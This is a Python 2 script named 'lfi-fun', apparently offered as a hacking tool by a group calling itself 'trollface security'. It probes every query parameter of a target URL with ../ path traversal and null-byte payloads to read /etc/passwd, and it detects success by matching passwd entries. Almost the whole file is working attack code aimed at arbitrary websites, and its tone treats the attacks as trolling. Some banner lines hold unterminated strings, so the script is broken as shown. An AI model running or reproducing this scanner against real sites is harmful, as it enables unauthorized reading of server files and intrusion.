# trollface security
# author: trollsec
# website: trollsec.cf
 
import getopt,  sys,  random,  urllib,  urllib2,  httplib,  re,  string,  os
from urllib2 import Request,  urlopen,  URLError,  HTTPError
from urlparse import urlparse
from time import gmtime, strftime
 
def print_usage():
    print_banner()
    print "[!] wrong argument and parameter passed. use --help and learn how to use this tool."
    print "[i] hint: you need to pass a value for --url=\"<value>\" ."
    print "[i] example: ./lfi_scanner.py --url=\"http://www.example.com/page.php?file=main\" "
    print ""
    print ""
    sys.exit()
    return
   
def print_help():
    print_banner()
    print "((Displaying the content for --help.))"
    print ""
    print "[Description]"
    print "lfi-fun"
    print "helps you to find LFI vulnerabilities."
    print ""
    print "[Usage]"
    print "./lfi_scanner.py --url=\"<URL with http://>\" "
    print ""
    print "[Usage example]"
    print "./lfi_scanner.py --url=\"http://www.example.com/page.php?file=main\" "
    print ""
    print "[Usage notes]"
    print "- always use http://...."
    print "- this tool does not work with SEO URLs, such as http://www.example.com/news-about-the-internet/."
    print "  if you only have a SEO URL, try to find out the real URL which contents parameters."
    print ""
    print "[Feature list]"
    print "- provides a random user agent for the connection."
    print "- checks if a connection to the target can be established."
    print "- tries to catch most errors with error handling. "
    print "- scans for LFI vulnerabilities. "
    print "- finds out how a possible LFI vulnerability can be exploited (e.g. directory depth)."
    print "- supports nullbytes"
    print "- supports common *nix targets, but no Windows systems."
    print "- creates a small log file."
    print ""
    print "[Some notes]"
    print "-tested with py."
    print ""
    print ""
    sys.exit()
    return
   
def print_banner():
    print ""
    print ""
    print ""
    print "lfi-fun"
    print "by trollface security"
    print ""
    print "Version 1.0                       "
    print "   
    print "   
    print "   
    print "power to teh lulz                 
    print "____________________________________________________"
    print ""
    return
 
def test_url(scan_url):
    print ""
    print "[i] assuming the provided data was correct."
    print "[i] trying to establish a connection with a random user agent..."
   
    user_agents = [
                            "Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8",
                            "Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre",
                            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6)",
                            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en)",
                            "Mozilla/3.01 (Macintosh; PPC)",
                            "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.9)",  
                            "Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",  
                            "Opera/8.00 (Windows NT 5.1; U; en)",  
                            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19"
                          ]
    user_agent = random.choice (user_agents)
    check=""
   
    request_website = urllib2.Request(scan_url)
    request_website.add_header('User-Agent', user_agent)
   
    try:
        check = urllib2.urlopen(request_website)
    except HTTPError,  e:
        print "[!] the connection could not be established."
        print "[!] error code: ",  e
        print "[!] exiting now!"
        print ""
        print ""
        sys.exit(1)
    except URLError, e:
        print "[!] the connection could not be established."
        print "[!] reason: ",  e
        print "[!] exiting now!"
        print ""
        print ""
        sys.exit(1)
    else:
        print "[i] connected to target! URL seems to be valid."
        print "[i] jumping to the scan and trolling feature."
    return
   
   
def scan_lfi(scan_url):    
    # Define all variables of this function
    parameters = {}
    original_value_of_tested_parameter = ""
    check_value_of_tested_parameter = ""
    check_value_of_tested_parameter_with_nullbyte = ""
    lfi_found = 0
    param_equals = "="
    param_sign_1 = "?"
    param_sign_2 = "&"
    nullbyte = "%00"
    one_step_deeper = "../"
    for_changing_the_dump_file_name = "_"
    max_depth = 20
    i = 0
    nullbyte_required = 1
    depth = 0
    query_string = ""
    modified_query_string = ""
    lfi_url_part_one = ""
    lfi_url_part_two = ""
    lfi_url_part_three = ""
    lfi_url_part_four = ""
    lfi_url = ""
    find_nasty_string = "root:x:0:0:"
    find_nasty_string_2 = "mail:x:8:"
    user_agents = [
                            "Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8",
                            "Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre",
                            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6)",
                            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en)",
                            "Mozilla/3.01 (Macintosh; PPC)",
                            "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.9)",  
                            "Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",  
                            "Opera/8.00 (Windows NT 5.1; U; en)",  
                            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19"
                          ]
    user_agent = random.choice (user_agents)
    lfi_response=""
    lfi_response_source_code = ""
    replace_string = ""
    replace_string_2 = ""
    replace_me = ""
    exploit_depth= 0
    folder_name = ""
    cd_into = ""
    log_file_name = ""
    local_file = "etc/passwd"
    local_file_for_first_test = "/etc/passwd"
    lfi_exploit_url = ""
   
     # We have to split up the URL in order to replace the value of the vulnerable parameter
    get_parsed_url = urlparse(scan_url)
    print "[i] IP address / domain: " + get_parsed_url.netloc
 
    if len(get_parsed_url.path) == 0:
        print "[!] The URL doesn't contain a script (e.g. target/index.php)."
    else:
        print "[i] Script:",  get_parsed_url.path
    if len(get_parsed_url.query) == 0:
        print "[!] The URL doesn't contain a query string (e.g. index.php?var1=x&controller=main)."
    else:
        print "[i] URL query string:",  get_parsed_url.query
        print ""
 
    # Finding all URL parameters
    if param_sign_1 in scan_url and param_equals in scan_url:
        print "[i] It seems that the URL contains at least one parameter."
        print "[i] Trying to find also other parameters..."
       
        # It seems that there is at least one parameter in the URL. Trying to find out if there are also others...
        if param_sign_2 in get_parsed_url.query and param_equals in get_parsed_url.query:
            print "[i] Also found at least one other parameter in the URL."
        else:
            print "[i] No other parameters were found."
           
    else:
        print ""
        print "[!] it seems that there is no parameter in the URL."
        print "[!] how am I supposed to find a vulnerability then?"
        print "[!] please provide an URL with a script and query string."
        print "[!] example: target/index.php?cat=1&article_id=2&controller=main"
        print "[!] hint: I can't handle SEO links, so try to find an URL with a query string."
        print "[!] this can most likely be done by having a look at the source code (rightclick -> show source code in your browser)."
        print "[!] exiting now!"
        print ""
        print ""
        sys.exit(1)
   
    # Detect the parameters
    # Thanks to atomized.org for the URL splitting and parameters parsing part!
    parameters = dict([part.split('=') for part in get_parsed_url[4].split('&')])
 
    # Count the parameters
    parameters_count = len(parameters)
   
    # Print the parameters and store them in single variables
    print "[i] The following", parameters_count, "parameter(s) was/were found:"
    print "[i]",  parameters
   
    # Have a look at each parameter and do some nasty stuff
    for index, item in enumerate(parameters):
        print "[i] Probing parameter \"",  item, "\"..."
       
        check_value_of_tested_parameter = local_file_for_first_test
        check_value_of_tested_parameter_with_nullbyte = local_file_for_first_test + nullbyte
        query_string = get_parsed_url.query
   
        # Find out what value the checked parameter currently has
        for key, value in parameters.items():
            if key == item:
                # Save the value of the vulnerable parameter, so we later can search in in the URL
                original_value_of_tested_parameter = value
   
      
        for depth in range(i, max_depth):
            replace_string = (depth * one_step_deeper) + local_file
            replace_string_2 = item + param_equals + (depth * one_step_deeper) + local_file
           
        
            if depth== 0:
                replace_string = local_file_for_first_test
                replace_string_2 = item + param_equals  + local_file_for_first_test
               
            replace_me = item + param_equals + original_value_of_tested_parameter
            modified_query_string = query_string.replace(replace_me,  replace_string_2)
           
            lfi_url_part_one = "".join(get_parsed_url[0:1]) + "://"
            lfi_url_part_two = "".join(get_parsed_url[1:2])
            lfi_url_part_three = "".join(get_parsed_url[2:3])  + "?"
            lfi_url_part_four = "".join(modified_query_string)  
            lfi_url = lfi_url_part_one + lfi_url_part_two + lfi_url_part_three + lfi_url_part_four
           
            request_website = urllib2.Request(lfi_url)
            request_website.add_header('User-Agent', user_agent)
   
            try:
                lfi_response = urllib2.urlopen(request_website)
            except URLError,  e:
                print "[!] The connection could not be established."
                print "[!] Reason: ",  e
            else:
                lfi_response_source_code = lfi_response.read()
                if find_nasty_string in lfi_response_source_code:
                    print "[+] Found signs of a LFI vulnerability! No nullbyte was required."
                    print "[+] URL: " + lfi_url
                    lfi_exploit_url  = lfi_url
                    nullbyte_required = 0
                    lfi_found  = 1
                    exploit_depth = depth
                    break
                else:
                    if find_nasty_string_2 in lfi_response_source_code:
                        print "[+] Found signs of a LFI vulnerability! No nullbyte was required."
                        print "[+] URL: " + lfi_url
                        lfi_exploit_url  = lfi_url
                        nullbyte_required = 0
                        lfi_found  = 1
                        exploit_depth = depth
                        break
       
        if nullbyte_required == 1:
            for depth in range(i, max_depth):
                replace_string = (depth * one_step_deeper) + local_file + nullbyte
                replace_string_2 = item + param_equals + (depth * one_step_deeper) + local_file + nullbyte
           
          
                if depth== 0:
                    replace_string = check_value_of_tested_parameter_with_nullbyte
                    replace_string_2 = item + param_equals  + check_value_of_tested_parameter_with_nullbyte
               
                replace_me = item + param_equals + original_value_of_tested_parameter
                modified_query_string = query_string.replace(replace_me,  replace_string_2)
           
                lfi_url_part_one = "".join(get_parsed_url[0:1]) + "://"
                lfi_url_part_two = "".join(get_parsed_url[1:2])
                lfi_url_part_three = "".join(get_parsed_url[2:3])  + "?"
                lfi_url_part_four = "".join(modified_query_string)  
                lfi_url = lfi_url_part_one + lfi_url_part_two + lfi_url_part_three + lfi_url_part_four
           
                request_website = urllib2.Request(lfi_url)
                request_website.add_header('User-Agent', user_agent)
               
                try:
                    lfi_response = urllib2.urlopen(request_website)
                except URLError,  e:
                    print "[!] The connection could not be established."
                    print "[!] Reason: ",  e
                else:
                    lfi_response_source_code = lfi_response.read()
                    if find_nasty_string in lfi_response_source_code:
                        print "[+] Found signs of a LFI vulnerability! Using the nullbyte was necessary."
                        print "[+] URL: " + lfi_url
                        lfi_exploit_url  = lfi_url
                        lfi_found  = 1
                        exploit_depth = depth
                        break
                    else:
                        if find_nasty_string_2 in lfi_response_source_code:
                            print "[+] Found signs of a LFI vulnerability! Using the nullbyte was necessary."
                            print "[+] URL: " + lfi_url
                            lfi_exploit_url  = lfi_url
                            lfi_found  = 1
                            exploit_depth = depth
                            break
       
    if lfi_found == 0:
        print "[!] Sorry, I was not able to detect a LFI vulnerability here."
        print "[!] Exiting now!"
        print ""
        print ""
        sys.exit()
 
    log_file_name = get_parsed_url.netloc + "_-_" + strftime("%d_%b_%Y_%H:%M:%S_+0000", gmtime()) + "_-_scan.log"
    FILE = open(log_file_name,  "w")
    FILE.write("lfi-fun - Log File\n")
    FILE.write("----------------------------------------------------------------------\n\n")
    FILE.write("Scanned URL:\n")
    FILE.write(scan_url + "\n\n")
    FILE.write("LFI URL:\n")
    FILE.write(lfi_exploit_url)
    FILE.close
 
    print ""
    print "[i] A small log file was created."
    print "[i] Completed the scan. Will now exit!"
    print ""
    print""
    sys.exit(1)
 
    return
   
   
def main(argv):
    scan_url=""
   
    try:
        opts,  args = getopt.getopt(sys.argv[1:],  "",  ["help",  "url="])
    except getopt.GetoptError   :
        print_usage()
        sys.exit(2)
   
    for opt,  arg in opts:
        if opt in ("--help"):
            print_help()
            break
            sys.exit(1)
        elif opt in ("--url") :
            scan_url=arg
           
    if len(scan_url) < 1:
        print_usage()
        sys.exit()
       
    print_banner()
    print "[i] Provided URL to scan: " + scan_url
   
    test_url(scan_url)
 
    scan_lfi(scan_url)
 
if __name__ == "__main__":
    main(sys.argv[1:])
   
